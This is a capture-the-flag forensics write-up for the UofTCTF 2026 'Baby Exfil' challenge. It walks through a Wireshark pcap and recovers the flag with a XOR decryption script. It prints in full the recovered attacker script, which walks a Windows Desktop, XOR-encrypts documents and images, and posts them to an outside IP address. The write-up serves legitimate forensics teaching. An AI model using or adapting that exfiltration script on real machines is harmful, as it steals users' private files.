## UofTCTF 2026 - Baby Exfil Writeup

"Team K&K has identified suspicious network activity on their machine. Fearing that a competing team may be attempting to steal confidential data through underhanded means, they need your help analyzing the network logs to uncover the truth.

Author: 0x157"

This is a writeup for this Forensics challenge for the UofTCTF 2026.

The challenge contains a file called `final.pcapng`, let's open it up on Wireshark.
Since we are talking about exfiltration, there might be some interesting in the files within this packet capture. Let's take a look with `File > Export Objects > HTTP`.

On packet #7560, we can find a suspicious Python script called `JdRlPr1.py`:

```python

import os
import requests

key = "G0G0Squ1d3Ncrypt10n"
server = "http://34.134.77.90:8080/upload"

def xor_file(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ ord(key[i % len(key)]))
    return bytes(result)

base_path = r"C:\Users\squid\Desktop"
extensions = ['.docx', '.png', ".jpeg", ".jpg"]

for root, dirs, files in os.walk(base_path):
    for file in files:
        if any(file.endswith(ext) for ext in extensions):
            filepath = os.path.join(root, file)
            try:
                with open(filepath, 'rb') as f:
                    content = f.read()
                
                encrypted = xor_file(content, key)
                hex_data = encrypted.hex()
                requests.post(server, files={'file': (file, hex_data)})
                
                print(f"Sent: {file}")
            except:
                pass

```

There are other files in the Export Objects tab with the Content-Type being `multipart/form-data`.
Looking at the these files in `File > Export Objects > HTTP`, they seem to be exfiltrated files that have been encrypted with this script.
Let's extract and decrypt them with this Python script:
```python

from binascii import unhexlify
import re

KEY = b"G0G0Squ1d3Ncrypt10n"
INPUT_FILE = "encrypted.hex"

def xor_decrypt(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

with open(INPUT_FILE, "r", errors="ignore") as f:
    lines = [line.strip() for line in f if line.strip()]

# extract filename
filename = "recovered.bin"
for line in lines:
    if "filename=" in line:
        match = re.search(r'filename="([^"]+)"', line)
        if match:
            filename = match.group(1)
        break

# actual file
hex_line = max(lines, key=len)
encrypted_bytes = unhexlify(hex_line)
decrypted = xor_decrypt(encrypted_bytes, KEY)

with open(filename, "wb") as f:
    f.write(decrypted)

print(f"[+] Decrypted file written as: {filename}")

```

Our flag is inside the exfiltrated picture called `HNderw.png`:

<img width="956" height="679" alt="image" src="https://github.com/user-attachments/assets/9df808fa-0da5-4ec6-af35-69491757fdf9"/>
